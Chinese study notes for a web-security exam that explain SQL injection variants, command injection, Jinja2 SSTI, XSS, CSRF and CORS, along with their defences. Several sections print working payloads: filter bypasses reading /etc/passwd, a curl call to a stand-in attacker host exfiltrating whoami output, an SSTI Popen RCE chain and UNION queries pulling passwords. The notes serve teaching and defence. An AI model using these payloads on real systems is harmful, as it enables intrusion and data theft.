# 📒 總衝刺大卷・逐題深度精講筆記

> 搭配 [`FINAL_SPRINT_MASTER_60Q.md`](FINAL_SPRINT_MASTER_60Q.md) 使用。本檔記錄一題一題拆解時的「機制層」講解與追問，供考前回看。
> **進度**：Q1 ～ Q6（持續更新中）。

---

## Q1 — SQLi 盲注頻寬（二分 vs 逐位元）

**答案 A**：二分約 7 次／字元；逐位元 8 次／字元。

### 核心觀念
- 盲注只能問「是／否」，**一次請求 = 1 bit 資訊**。
- 「抽一個字元要幾次」= 「要問幾個是非題才能鎖定它」= 資訊理論問題。

### 方法一：二分搜尋 → ⌈log₂(字集大小)⌉
每問一次把候選範圍砍一半：`128→64→32→16→8→4→2→1` 共 7 刀 → `log₂128 = 7`。
- 256 種→8、128 種→7、95 種(可打印)→7、16 種(hex)→4、10 種→4。

### 方法二：逐位元(bit-by-bit) → 固定 8 次
直接問每個 bit 是 0/1；ASCII 一字元 = 1 byte = 8 bit → 死問 8 次。

### ⚠️ 關鍵追問：最高位恆 0，逐位元為何還要 8 次？
**追問正確。** 「8 次」是**不做任何假設、把字元當完整 byte(256 種)**的 baseline。
一旦利用「ASCII 最高位恆 0」的先驗知識跳過該位 → 逐位元也只要 **7 次**，與二分一致。

> **真相：請求次數不是方法決定的，是「候選集大小 / 已知位元」決定的。**
> 次數 ≈ ⌈log₂(候選字集大小)⌉。能把候選集縮多小就問多少次。

| 前提假設 | 候選範圍 | 次數 |
|:--|:--|:--:|
| 不假設，當完整 byte | 256 | 8 |
| 標準 ASCII(最高位=0) | 128 | 7 |
| 可打印字元 | 95 | 7 |
| 純 hex(hash) | 16 | 4 |
| 純數字(PIN) | 10 | 4 |

Q1 的「7 vs 8」其實是**蘋果比橘子**：二分被餵了 128 的前提、逐位元沒套優化。考試慣例框架選 A，但真正要懂的是上面那條原則。

### 誘答
- 128 次 = 線性枚舉最差情況，不是二分/逐位元。
- 4 次 = 16 字集的二分，字集記錯。

---

## 補充 — ASCII 為什麼是「128 種」

### 來源：ASCII 是 7 位元編碼
`2⁷ = 128` → 編號 0~127，精確 128 個。

### 三區結構
| 編號 | hex | 類別 | 內容 |
|:--|:--|:--|:--|
| 0~31 | 00~1F | 控制字元 | 換行、Tab、NULL(看不見) |
| 32~126 | 20~7E | **可打印** | 空白、符號、數字、字母(95 個) |
| 127 | 7F | 控制字元 | DEL |

### 四個必背錨點(手算用)
| 字元 | 十進位 | hex |
|:--|:--:|:--:|
| 空白 | 32 | 0x20 |
| `0` | 48 | 0x30 |
| `A` | 65 | 0x41 |
| `a` | 97 | 0x61 |

推算：`0~9`=48~57、`A~Z`=65~90、`a~z`=97~122；**大寫+32=小寫**(A 65 → a 97)。

### 128 vs 256
ASCII 用 7 bit(128)；電腦存字元用 1 byte=8 bit(256)。第 8 位在純 ASCII 恆 0；全用上 = Extended ASCII(256)。這正是 Q1「二分 7 省掉恆 0 的第 8 位、逐位元 8 沒省」的根源。

### 誘答/混淆
- 把「128 種」當「試 128 次」(那是線性枚舉)。
- 以為 ASCII 是 256(256 是 byte/Extended，標準 ASCII 是 128)。
- 可打印(95) vs 全範圍(128) 混淆。

---

## Q2 — 時間盲注延遲函數跨 DB

**答案 D**：Oracle 用 `SLEEP(5)` 是錯的（Oracle 沒有 SLEEP）。

### 為什麼需要延遲函數
時間盲注：頁面回應完全一致，無「存在/不存在」狀態 → 只剩「時間」可觀測。
用 `' AND IF(條件, SLEEP(5), 0)-- `：延遲=是、立即=否。一次仍 1 bit。

### 四大 DB 延遲語法（必背）
| DB | 語法 |
|:--|:--|
| MySQL | `SLEEP(5)` / `BENCHMARK(5000000, MD5('a'))` |
| PostgreSQL | `pg_sleep(5)` |
| MSSQL | `WAITFOR DELAY '0:0:5'`（時:分:秒） |
| **Oracle** | `dbms_pipe.receive_message('a', 5)`（**無 SLEEP**；等不存在的管線訊息拖時間）|

Oracle 另有 `DBMS_LOCK.SLEEP(5)` 但需權限，實戰多用 `dbms_pipe.receive_message`。

### 延伸：延遲語法也是 DB 指紋辨識
哪個語法讓它睡著 → 判斷後端是哪種 DB。金盾愛考雙向。

### 其他 DB 指紋差異（常一起考）
| 功能 | MySQL | MSSQL | Oracle | PostgreSQL |
|:--|:--|:--|:--|:--|
| 串接 | `CONCAT()` | `+` | `\|\|` | `\|\|` |
| 取第一筆 | `LIMIT 1` | `TOP 1` | `ROWNUM=1` | `LIMIT 1` |
| 當前使用者 | `user()` | `SYSTEM_USER` | `USER` | `current_user` |
| 版本 | `version()` | `@@version` | `v$version` | `version()` |

**睡覺四兄弟**：MySQL `SLEEP`／PG `pg_sleep`／MSSQL `WAITFOR DELAY`／Oracle 沒 SLEEP 用 `dbms_pipe`。

---

## Q3 — 命令注入空格繞過

**答案 D**：`cat%20/etc/passwd` 無法繞過（`%20` 解碼後還是空格，被過濾擋下）。

### 命令注入本質
後端把輸入直接拼進系統命令：`system("ping -c 4 ".$_GET['host'])`。
輸入 `8.8.8.8; cat /etc/passwd` → `;` 串接第二條命令。
防守方常過濾空格（命令需空格分隔參數）→ 攻擊方用「非空格但 shell 當分隔符」的東西繞。

### 四選項層級分析
| 選項 | 可否 | 原理 | 層 |
|:--|:--:|:--|:--|
| `cat${IFS}/etc/passwd` | ✅ | `IFS`=內部欄位分隔符，預設含空白，shell 展開成空格 | Shell 層 |
| `cat</etc/passwd` | ✅ | `<` 輸入重定向，兩邊不需空格 | Shell 層 |
| `{cat,/etc/passwd}` | ✅ | brace 展開，逗號當分隔符 | Shell 層 |
| `cat%20/etc/passwd` | ❌ | `%20` 是 URL 編碼空格，**到過濾器前已被伺服器解碼回空格** | 傳輸層 |

### 核心觀念：繞過要打在「正確的層」
- 傳輸層編碼(`%20`、`%0a`)→ 伺服器解碼後還原，騙不過應用層過濾。
- Shell 解析層(`${IFS}`、`<`、`{,}`、`$IFS$9`)→ shell 自己展開，字面上沒被過濾的字元。
> **要繞 shell 過濾，就用 shell 會展開的東西。**

### 其他高頻繞過
- 繞空格：`${IFS}`、`<`、`{cmd,arg}`、`$IFS$9`、Tab
- 繞串接過濾：`;`、`|`、`||`、`&&`、`$(...)`、反引號
- 繞關鍵字黑名單：`c""at`、`c\at`、`/bin/ca''t`
- 盲命令注入：`;sleep 5`(時間)、`;curl attacker/$(whoami)`(OOB)

### 防禦
根本：參數化執行 API，命令與參數分開傳 `subprocess.run(["ping","-c","4",host])`（**不要** `shell=True` 拼字串）。黑名單過濾不可靠。

---

## Q4 — SSTI 物件繼承鏈逃逸

**答案 B**：SSTI(Jinja2)；下一步找 `subprocess.Popen` 等類別達成 RCE。

### SSTI vs XSS 界線
| | 執行地點 | 求值者 |
|:--|:--|:--|
| XSS | 受害者瀏覽器 | JS 引擎 |
| SSTI | 伺服器 | 模板引擎 |
`{{7*7}}`→`49` 是伺服器算的 → SSTI。回傳 Python 類別 → Jinja2。

### 逃逸鏈逐段（深度核心）
```
''                      空字串物件(起點)
.__class__              → <class 'str'>  拿到類別
.__mro__                → (str, object)  繼承鏈
.__mro__[1]             → object         萬物共同祖宗
.__subclasses__()       → [所有已載入類別清單]  ← 題目看到的長清單
```
清單裡藏危險類別：`subprocess.Popen`(執行命令)、`os._wrap_close`、`warnings.catch_warnings`(摸到 `__builtins__`)。

### 下一步 RCE
```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate() }}
```
鏈子一句話：`'' → __class__ → __mro__[1](object) → __subclasses__() → 挑 Popen → RCE`。

### 各引擎 SSTI 指紋
| 引擎 | 語言 | 探測 | 特徵 |
|:--|:--|:--|:--|
| Jinja2 | Python | `{{7*'7'}}`→`7777777` | 有 `__class__` 鏈 |
| Twig | PHP | `{{7*'7'}}`→`49` | 與 Jinja2 區分點 |
| Freemarker | Java | `${7*7}`→49 | `${}` |
| Thymeleaf | Java | `__${7*7}__` | Spring |
| ERB | Ruby | `<%= 7*7 %>` | |
| Smarty | PHP | `{7*7}` | 單括號 |

> **Jinja2 vs Twig**：`{{7*'7'}}` → Jinja2 回 `7777777`、Twig 回 `49`。

### 防禦
別用 `render_template_string(user_input)`；使用者資料只當變數傳入，不拼進模板碼。

---

## Q5 — 寬字節注入・位元組層機制

**答案 A**：`%27`被轉`%5c%27`，`%df%5c` 在 GBK 合成一個漢字吃掉 `%5c`，`%27` 脫逸。

### 兩個防守機制如何反成漏洞
1. `addslashes`：把 `'`(0x27)→ `\'`(0x5C 0x27)，想讓引號失效。
2. GBK 寬字節：一個漢字兩 byte；高位 0x81~0xFE、低位 0x40~0xFE(**含 0x5C**)。看到高位 byte 就把它和下一 byte 綁成漢字。

### 逐位元組（核心）
```
送出：        DF 27            (0x27 = ')
addslashes：  DF 5C 27         (對 0x27 加 0x5C 反斜線)
GBK 解碼：    [DF 5C]=漢字  27  (0x5C 被併進漢字吃掉，0x27 單引號復活)
```
反斜線 0x5C 被 GBK 消化 → 被保護的單引號脫逸 → 注入成立。

> **本質：攻擊者送高位 byte(0xDF)拉走 addslashes 加的反斜線(0x5C)配成漢字，引號脫逸。**

### 選項錯因
- B：`%df` 不等於引號（它的作用是拉走反斜線）。
- C：addslashes 照常加斜線，問題是加了被吃掉。
- D：**UTF-8 不成立**（UTF-8 結構嚴謹，0x5C 永遠獨立）。寬字節注入只在 GBK/Big5/Shift-JIS 等「低位含 0x5C」的編碼有效。

### 三個必要條件
addslashes/magic_quotes + 寬字節連線編碼(GBK) + 字串情境。

### 防禦
連線編碼用 utf8mb4 + `mysqli_set_charset` + 參數化；`mysqli_real_escape_string`(參考連線編碼)取代 addslashes。

> 靈魂：**不同層對同一串 byte 解讀不一致**（addslashes 看「反斜線+引號」、GBK 看「漢字+引號」）。同族：HTTP 走私(CL vs TE)、Unicode 正規化繞過。

---

## Q6 — ORDER BY 與識別字注入

**答案 B**：識別字(欄位/表名/關鍵字)不可參數化，只有「值」能綁；須伺服器端白名單映射。

### 預編譯為何能防注入：協定層「碼/值分離」
```
第1次：送查詢骨架先編譯   SELECT * FROM users WHERE name = ?
第2次：另送資料值         參數[0]="admin' OR 1=1"
```
DB 在「看到值之前」就把語法樹編譯定型 → 後到的值只能當字串填進 `?`，改不動結構 → 注入被擋。
> 關鍵：**語法樹在編譯期定型；值是執行期才填**。

### 為何識別字不能用 `?`
`?` 只能放「值」能出現的位置。欄位名/表名/關鍵字是**語法結構**，DB 編譯期就得知道（才能規劃執行計畫），若還是 `?` 無法完成編譯 → 拋語法錯誤。
不能綁：`ORDER BY ?`、`GROUP BY ?`、`FROM ?`、`ORDER BY col ?`(ASC/DESC)。
例外：`LIMIT ?` 多數 DB 可（算數值）。

### 正解：白名單映射
```python
ALLOWED = {"price":"price","date":"created_at","name":"product_name"}
col = ALLOWED.get(user_input, "id")     # 不在白名單退回安全預設
order = "ASC" if user_dir=="asc" else "DESC"
sql = f"SELECT * FROM items ORDER BY {col} {order}"
```
拼進 SQL 的字串永遠來自自己的白名單常數，不是使用者原始輸入。

### 選項錯因
- A：是 SQL 標準設計非 bug（拋錯是正確行為）。
- C：預編譯跨 DB，與廠牌無關。
- D：前端過濾可繞，驗證必須在伺服器端。

### 延伸：ORDER BY 注入危害
`WHERE` 參數化 ≠ 安全；ORDER BY 仍拼字串可盲注：
```sql
ORDER BY (SELECT IF(1=1,SLEEP(5),0))                      -- 時間盲注
ORDER BY (CASE WHEN (子查詢)='a' THEN name ELSE price END) -- 布林盲注
```

> **`?` 只能綁值，不能綁欄位名/表名/關鍵字/排序方向**（結構編譯期定型、值執行期填）。可控排序欄位 → 白名單映射。

---

---

## Q7 — UNION 注入必要先決條件

**答案 B**：欄位數相同 + 對應型態相容 + 結果需被回顯。

### UNION 在做什麼
`UNION` 把兩個 SELECT 結果上下相接。攻擊者加掛一條查 `users` 的 SELECT，讓 DB 把帳密跟商品一起回傳、被頁面渲染出來。是**最快**的注入（一發拉整表，不像盲注 1 bit/次）。

### 三個必要條件
1. **欄數相同**：兩邊欄數不等 → DB 直接報錯。
   - 測欄數：`' ORDER BY n--` 遞增到報錯（報錯前最大值=欄數）；或 `' UNION SELECT NULL,NULL,...--` 補到不報錯。
2. **對應型態相容**：型態不符某些 DB 報錯。用 `NULL`（相容任何型態）純測欄數，再逐欄測哪欄可放字串。
3. **結果要回顯** ⭐：查到但頁面不顯示 → 看不到。先找「哪一欄被印在畫面」(reflected column)：
   `' UNION SELECT 'A','B','C'--` 看畫面出現哪個 → 把 `username` 放那欄。
   無任何回顯 → UNION 用不了，退回盲注。

### 實戰流程
```
1. 測欄數:   ' ORDER BY 3--成功、4--報錯 → 3 欄
2. 找回顯欄: ' UNION SELECT 'A','B','C'-- → 顯示 B → 第2欄
3. 抽資料:   ' UNION SELECT NULL,concat(username,':',password),NULL FROM users--
```

### 選項錯因（全誘答）
- A 堆疊查詢：UNION 是單一 SELECT 內的語法，不需 `;` 堆疊。
- C 遠端 root：透過既有 web 連線打，與 DB 權限無關。
- D CORS：瀏覽器機制，與伺服器端 SQL 無關。

### 注入方式決策樹
有回顯→**UNION**；只有報錯→**Error-based**；回應有差異→**Boolean 盲注**；完全一致→**Time 盲注**。

---

## Q8 — 二階注入 Second-Order SQLi

**答案 B**：汙染資料先落庫、於另一處被信任取用時才觸發。

### 一階 vs 二階（靈魂：注入何時發作）
- **一階**：輸入 → 立刻拼進 SQL → 當場發作（輸入點=觸發點）。Q1~Q7 都是一階。
- **二階**：輸入 → 先安全存進 DB（沒事）→ 稍後**另一功能**取出再拼 SQL 才爆（**輸入點 ≠ 觸發點**，時間地點都分離）。

### 本題情境
```
① 註冊: 暱稱 admin'-- 被正確跳脫 → 安全存進 DB (開發者測註冊一切正常)
② 改密碼: 後端用「當前使用者暱稱」組 SQL，以為 DB 資料乾淨不再跳脫 ← 致命假設
   UPDATE users SET pass='x' WHERE name='admin'--'  → '-- 閉合註解,爆
```

### 為何陰險
打破「資料庫裡的資料可信、不用再過濾」的錯誤假設。掃描器看第一個請求（註冊）輸入被跳脫判定安全；真正注入在第二個看似無關請求、且用「內部資料」，流量看不出 payload。

### 防禦：資料無信任邊界
**所有要拼進 SQL 的資料（不管來自使用者/DB/內部 API）一律參數化。** 可信度不由來源決定。

### 選項錯因
- A 一階：本題輸入先落庫稍後他處觸發，非當場。
- C 寬字節：編碼層問題，與時序無關。
- D 盲注：是「無回顯萃取手法」，本題講的是「觸發時序」，不同維度。

### 延伸
同族：Stored XSS（payload 先存、他人瀏覽才觸發）、二階命令注入。共通特徵：**輸入點 ≠ 觸發點**。

---

---

## Q9 — 堆疊查詢與批次語句

**答案 A**：PHP + MySQLi 的 `mysqli_query()`（單語句 API，預設不執行多語句）。

### 堆疊查詢 vs UNION
- 堆疊：用 `;` 塞**任何**獨立語句（DROP/UPDATE/INSERT/EXEC），破壞力最大。
- UNION：只能加掛 SELECT，受欄數/型態限制。

### 核心：能不能堆疊由「API/驅動」決定，不是 DB 引擎
MySQL 引擎本身支援多語句，但 `mysqli_query()` 設計成「一次一條」，送 `SELECT...; DROP...` **只執行第一條**，後面被擋。所以 PHP+MySQL（最常見組合）預設堆疊打不出來（反直覺高頻考點）。
- `mysqli_multi_query()` 才支援多語句，但少用於使用者輸入。

### 支援度對照
| 環境 | 堆疊 |
|:--|:--:|
| PHP + `mysqli_query` | ❌ 預設關（本題）|
| PHP + MSSQL/PostgreSQL | ✅ 常可 |
| **.NET + MSSQL (ADO)** | ✅ 經典溫床（`; EXEC xp_cmdshell`）|

### 選項錯因
- B MSSQL+ADO：恰是支援堆疊的經典環境，不是被封鎖。
- C PostgreSQL：驅動通常允許多語句。
- D「任何 DB 都支援」：錯誤迷思，取決於 API/驅動。

### 實戰意義
看到 PHP+MySQL → `;DROP` 可能沒用，改走 UNION/盲注；若 `';...` 能執行多語句 → 很可能 MSSQL/.NET → 試 `xp_cmdshell`。

> **能否堆疊看 API 層**；PHP `mysqli_query` 擋、MSSQL+ADO 是溫床。「Bobby Tables」梗在 PHP+MySQL 其實打不出來。

---

## Q10 — SQLi 根本防禦總結（Part 1 收官）

**答案 A**：參數化查詢在協定層分離碼/值（根本）+ 識別字用白名單。

### 為何參數化是根本
SQLi 本質 = 使用者「資料」被當「程式碼」執行。參數化靠協定層碼/值分離（見 Q6），**讓資料根本沒機會變程式碼**（不是過濾壞字元）。
完整防禦兩層：值位置→參數化；結構位置(ORDER BY/表名)→白名單映射（Q6）。

### 三大誘答為何不是根本
- **B WAF**：黑名單可無限變形繞過（`UNiOn`、`/**/`、編碼…見 Q3），是縱深一層非根治。
- **C addslashes**：①寬字節繞過（Q5 GBK `%df'`）②數字型注入 `id=1 OR 1=1` 不需引號 → 破功。
- **D 前端 JS 驗證**：攻擊者用 Burp/curl 直接繞過前端打後端。**安全驗證永遠在伺服器端**。

### 縱深體系（問「有哪些措施」時）
根本層(參數化+白名單) ＞ 輸入層(型態驗證) ＞ 權限層(DB 最小權限) ＞ 縱深層(WAF/ORM) ＞ 監控層(不洩報錯擋 Error-based)。
> 問「根本/最可靠」永遠選**參數化**。

### Part 1 總綰
注入本質 = 「資料被當程式碼」，根治 = 「碼/值分離」。Q1 盲注頻寬→Q2 延遲→Q3 命令注入→Q4 SSTI→Q5 寬字節→Q6 ORDER BY→Q7 UNION→Q8 二階→Q9 堆疊→Q10 防禦總綱。

---

---

# ⭐ 概念釐清（易混淆，務必釘死）

## HttpOnly 不能防 XSS（重要更正）
**HttpOnly 無法防止 XSS，只能減輕 XSS 的「其中一個後果」——透過 `document.cookie` 偷 session cookie。**
XSS 一旦成立，攻擊者的 JS 照跑，HttpOnly 擋不住：以受害者身分發請求(fetch 仍自動帶 HttpOnly cookie)、鍵盤側錄、偷表單帳密、竄改頁面、讀敏感資料外送。
> 防 XSS 真正靠：**輸出編碼(根本) → CSP(擋執行) → HttpOnly(只減災)**。HttpOnly 在最後一道且只減災。
> 考點：「HttpOnly 可防止 XSS」= **錯**。「防 XSS 最根本」= **輸出編碼**。

## XSS vs CSRF：兩種不同攻擊，各配各的防禦
**CSRF 是「攻擊」不是「保護」**（CSRF Token 才是防禦）。XSS 與 CSRF 平行、不互相保護。

| | XSS | CSRF |
|:--|:--|:--|
| 攻擊者做什麼 | 讓惡意 JS 在受害者瀏覽器執行 | 讓受害者不知情發出一個請求 |
| 看得到回應嗎 | 看得到 | 看不到(只借身分發請求) |
| 濫用什麼 | 網站對輸入沒輸出編碼 | 瀏覽器自動帶 cookie 的信任 |

| 攻擊 | 根本防禦 | 輔助/減災 |
|:--|:--|:--|
| XSS | 輸出編碼 | CSP、HttpOnly |
| CSRF | CSRF Token | SameSite、驗 Origin/Referer |

cookie 旗標歸屬：**HttpOnly→XSS 減災｜SameSite→CSRF 防禦｜Secure→傳輸(HTTPS)**。
> 關係：**XSS 比 CSRF 強**——有 XSS 就能用 JS 讀出 CSRF Token 偽造請求，繞過 CSRF 防線。所以防好 XSS 是保護 CSRF Token 的前提。

## 同源政策 / CORS / CSRF / XSS：前端信任邊界觀念地圖
**CORS 本身不是防禦，是「有控制地鬆綁同源政策(SOP)」。** 真正的牆是 SOP；CORS 是在牆上開指定的洞。正確 CORS = 不把洞開給不可信來源（不破壞 SOP 保護）。

### CORS/SOP 管的是「跨源**讀取回應**」
保護的是回應資料的機密性。配錯(反射任意 Origin + credentials:true) → **跨源資料竊取**：evil.com 帶受害者 cookie 讀到其私密回應。配對 → 不製造此漏洞。

### 三種攻擊歸屬（釘死）
| 攻擊 | 方向 | CORS 管得到？ | 真正防禦 |
|:--|:--|:--:|:--|
| 跨源資料竊取 | 跨源**讀**回應 | ✅ CORS 的領域 | 正確 CORS(只開洞給信任來源) |
| CSRF | 跨站**發**請求(寫/動作) | ❌ 無關 | CSRF Token、SameSite |
| XSS | **同源**執行惡意 JS | ❌ 無關(且凌駕 CORS) | 輸出編碼、CSP、HttpOnly |

### 兩個關鍵釐清
1. **CORS 不防 CSRF**：CSRF 傷害在「請求送達、動作發生」那刻，攻擊者不需讀回應；CORS 只管「能不能讀回應」，擋不住請求執行。防 CSRF 靠 Token/SameSite。
2. **CORS 不防 XSS**：XSS 的 JS 是**同源**執行(就是網站本尊的腳本)，CORS 只管跨源、對同源不設限。更甚：XSS 一旦成立，攻擊者「變成同源」→ SOP/CORS 整套「分辨自己人/外人」的前提失效，連 CSRF Token、非 HttpOnly cookie 都能讀。

> **一句話**：**跨源讀=CORS管｜跨站寫=CSRF管｜同源跑惡意碼=XSS(輸出編碼/CSP管)**。
> XSS = 讓攻擊者「變成同源」→ 繞過整套信任邊界機制。

---

## Q11 — DOM-based XSS

**答案 B**：fragment(`#`後)不送伺服器，伺服器端 WAF/過濾看不到。

### XSS 三型分類軸：payload 走什麼路徑進頁面
| 型別 | 路徑 | 惡意碼在哪被注入 |
|:--|:--|:--|
| Reflected | 請求→伺服器→立刻反射回同頁 | 伺服器產生的 HTML |
| Stored | 存 DB→之後訪客取出渲染 | 伺服器 HTML(來自 DB) |
| DOM-based | **全在前端**，JS 從 Source 讀寫進 DOM | 瀏覽器 JS，伺服器沒參與 |

### 為何伺服器看不到：`#` 後 fragment 不送出
```
https://site/page?name=bob#<script>...</script>
瀏覽器實際送：GET /page?name=bob  ← # 後整段留在本地，不進請求
```
JS `innerHTML = location.hash.substring(1)` → payload 從本地 Source 到本地 Sink，全程不經伺服器 → WAF/後端過濾無從攔截 → **只能前端防**(用 `textContent`、DOMPurify)。

### Source→Sink 框架
- Source(可控來源)：`location.hash/search/href`、`document.URL/referrer`、`window.name`、`postMessage`、`localStorage`。
- Sink(危險匯點)：`innerHTML`、`document.write`、`eval`、`setTimeout(string)`、`.src=javascript:`。

### 三型判別
payload 經過伺服器嗎？沒有=DOM、當場反射=Reflected、存了再取=Stored。

---

## Q12 — CSP nonce 與 strict-dynamic

**答案 B**：只放行帶對 nonce 的 script；strict-dynamic 讓受信任腳本動態載入的子腳本獲信任，並停用 host 白名單。

### CSP = XSS 第二道防線
就算注入成功，CSP 讓瀏覽器拒絕執行未授權腳本。

### nonce = 一次性隨機通行證
伺服器每次產生不可預測的 nonce，放進 CSP 標頭與自己的 `<script nonce="...">`；瀏覽器只執行 nonce 相符的 script。攻擊者猜不到 nonce → 注入的 script 無通行證被擋。
> **前提：nonce 每次隨機、不可預測**(固定/可猜則失效→選項 D 錯)。

### strict-dynamic = 信任沿程式碼鏈傳遞
受信任腳本(帶 nonce)動態載入的子腳本自動繼承信任；同時**停用 host 白名單與 unsafe-inline**。原因：網域白名單常被 JSONP/開放重定向繞過。

### 選項錯因
- A：nonce 機制下 inline 無 nonce 不能執行(恰相反)。
- C：CSP 是前端/XSS 領域，**不防 SQLi**。
- D：nonce 必須不可預測。

---

## Q13 — Cookie SameSite

**答案 D（錯誤敘述）**：`SameSite=None` **必須**配 `Secure`，不是「不需 Secure 可在 HTTP 生效」。

### SameSite 對付 CSRF（管跨站請求是否自動帶 cookie）
| 值 | 跨站攜帶 | 用途 | 規定 |
|:--|:--|:--|:--|
| Strict | 完全不帶(連點連結都不帶) | 高敏感 | — |
| Lax(現代預設) | 只頂層導覽 GET 帶 | 一般 | 擋跨站自動 POST |
| None | 全部都帶 | 第三方嵌入/SSO/跨域 API | **必須配 Secure，否則瀏覽器拒絕** |

### 為何 None 必配 Secure
None 暴露面最大，若又走明文 HTTP 易被竊聽 → 瀏覽器強制：要用最鬆的 None 就得用 HTTPS 保護。
> 設計哲學「越開放越要補強」同見 CORS(credentials 不能配 `*`)。

### 旗標分工（別混）
SameSite→CSRF｜HttpOnly→XSS 竊 cookie｜Secure→竊聽。
SameSite 非銀彈，Lax 仍放行頂層 GET → 配 CSRF Token。

---

## Q14 — CSRF 成立條件

**答案 D（非必要條件）**：「伺服器存在 SQL 注入」與 CSRF 無關。

### CSRF 本質：混淆代理人(confused deputy)
誘導已登入受害者，用其身分發請求。攻擊者**看不到回應**，只是借瀏覽器+身分發一個請求。

### 三個必要條件(A/B/C)
- A 僅靠「自動攜帶的憑證」(cookie/Basic Auth)驗身分 → 若用 header 放 Bearer token(需手動帶)則 CSRF 失效。
- B 無不可預測參數(無 CSRF Token) → 有 token 攻擊者構造不出完整請求。
- C 受害者已登入(有有效 session)。

### D 為何不是
CSRF 濫用身分驗證信任、不碰 DB；SQLi 是資料庫輸入問題。完全不相干(混搭不相干漏洞=誘答，同 Q7 把 CORS 塞進 UNION)。

### 防禦
CSRF Token(主流) + SameSite + 驗 Origin/Referer + 雙重提交 cookie + 敏感操作重新驗證。
> 純 token-based API(Bearer 放 header)天生抗 CSRF；但 token 若存 cookie 又怕 CSRF。關鍵：**憑證會不會被瀏覽器自動帶上**。

---

---

## Q15 — CORS 錯配判定

**答案 A**：帶憑證的 CORS 必須用具體 Origin(不能 `*`)；漏洞不在「非萬用字元」，而在「未驗證就反射不可信 Origin」。

### CORS 背景
瀏覽器同源政策禁止 JS 讀跨源回應。CORS 是伺服器用回應標頭「開例外」：
- `ACAO`：允許哪個來源讀回應。
- `ACAC: true`：允許對方帶 cookie 等憑證來（風險最高）。

### 核心：帶憑證時 `*` 被禁（你的直覺正確）
`ACAO: *` + `ACAC: true` → **瀏覽器直接拒絕**（規範禁止）。所以要支援帶憑證跨源，**必須指定具體 Origin**——用具體 Origin 不是罪。

### 漏洞在「反射」不在「具體」
- 安全：伺服器有白名單，驗證 Origin 在清單才回填。
- 漏洞：**不驗證就把請求帶來的 Origin 原樣回填**（反射），對任何來源都放行 → 等同 `*`+credentials 還繞過瀏覽器禁令。
```
evil.com JS: fetch('https://victim/me',{credentials:'include'})
→ victim 反射 evil.com 到 ACAO + ACAC:true → evil 讀到受害者私密資料
```

### 如何證明「反射」（回應 A2 的模糊性）
單一回應無法 100% 區分「反射」vs「手殘把 evil 加白名單」。證明反射要**換 Origin 再送，看 ACAO 是否跟著變**。本題題幹明寫「對任意請求都反射」，故判定明確。

### 選項錯因
- B「不是 * 就安全」：反射任意 Origin 技術上是具體 Origin 但一樣危險。看「有沒有驗證」不看「是不是萬用字元」。
- C「拒絕所有帶憑證跨源」：合法的帶憑證跨源存在（具體 Origin+ACAC:true）。
- D「可防 CSRF」：CORS 管「能不能讀回應」、CSRF 管「能不能發請求」，錯配 CORS 反而擴大攻擊面。

### 判定表
| ACAO | ACAC | 結果 |
|:--|:--|:--|
| `*` | false | 允許任意源讀(不帶憑證) |
| `*` | true | **瀏覽器拒絕**(非法) |
| 具體(白名單驗證) | true | ✅ 安全 |
| 反射任意 Origin | true | 🔴 高危 |
| `null` | true | 🔴 sandbox iframe 可偽造 |

> 危害看「ACAC:true + 來源未驗證(反射/null/過寬)」，不看是不是 `*`。

---

## 🔜 待續
- Q16~Q60 的深度解析 → 見獨立檔 [`REMAINING_Q16-Q60_DEEPDIVE.md`](REMAINING_Q16-Q60_DEEPDIVE.md)。
